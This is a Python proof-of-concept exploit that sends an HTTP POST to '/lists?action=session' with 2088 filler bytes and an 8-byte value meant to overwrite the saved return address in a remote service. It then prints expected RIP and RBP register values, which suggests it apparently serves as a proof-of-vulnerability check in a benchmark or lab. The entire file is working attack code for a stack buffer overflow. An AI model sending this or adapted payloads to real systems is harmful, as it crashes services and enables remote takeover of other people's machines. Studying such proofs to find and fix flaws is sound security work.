import socket
from struct import *
import os
import sys

def start(HOST, PORT):
    method = b'POST '
    action = b'/lists?action=session'
    version = b' HTTP/1.1\r\n'

    status_line = method + action + version

    body = b''
    body += b'A' * 2088
    #body += 'HELLO'
    body += pack("Q" , 0x0000424242424242)
    body+= b'\0'

    header = b'Content-Length: %d\r\n\r\n' %len(body)

    req = status_line + header + body

    s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s1.connect((HOST, PORT))
    s1.send(req)

    print('SENT')
    
    s1.close()

def main():
    if(len(sys.argv) == 3):
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
        
    elif('HOST' in os.environ and 'PORT'):
        HOST = os.environ['HOST']
        PORT = int(os.environ['PORT'])
        
    else:
        print('[ERROR] target and port must be specified via arguments or variables.') 
        sys.exit()


    start(HOST, PORT)

    print('REGISTER_RIP=0000424242424242')
    print('REGISTER_RBP=4141414141414141')

if __name__ == '__main__':
    main()
